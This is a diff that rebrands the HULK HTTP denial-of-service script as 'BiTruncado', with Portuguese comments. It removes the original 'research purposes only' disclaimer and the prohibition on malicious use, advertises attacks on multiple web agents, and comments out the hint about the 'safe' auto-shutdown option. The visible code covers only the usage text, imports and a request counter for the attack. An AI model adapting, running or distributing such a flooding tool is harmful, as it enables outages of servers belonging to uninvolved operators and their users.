@@ -1,11 +1,10 @@
-# ----------------------------------------------------------------------------------------------
-# HULK - HTTP Unbearable Load King
-#
-# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
-# to their knees by exhausting the resource pool, its is meant for research purposes only
-# and any malicious usage of this tool is prohibited.
-#
+
+#----------------------------------------------------------------------------------------------
+# Esse Código e uma adptação do codigo  HULK - HTTP Unbearable Load King
 # author :  Barry Shteiman , version 1.0
+# Nova Version BiTruncado
+#  - Atakk a varios agentes WeB
+#  - Portas Melhoradas
 # ----------------------------------------------------------------------------------------------
 import urllib2
 import sys
@@ -70,8 +69,8 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	print 'USAGE: python hulk.py <url>'
-	print 'you can add "safe" after url, to autoshut after dos'
+	print 'Para usar: python BiTruncado.py <url>'
+	# print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
 
 	
@@ -128,7 +127,7 @@ class MonitorThread(threading.Thread):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- HULK Attack Finished --"
+			print "\n-- BiTruncado Attack Finished --"
 
 #execute 
 if len(sys.argv) < 2:
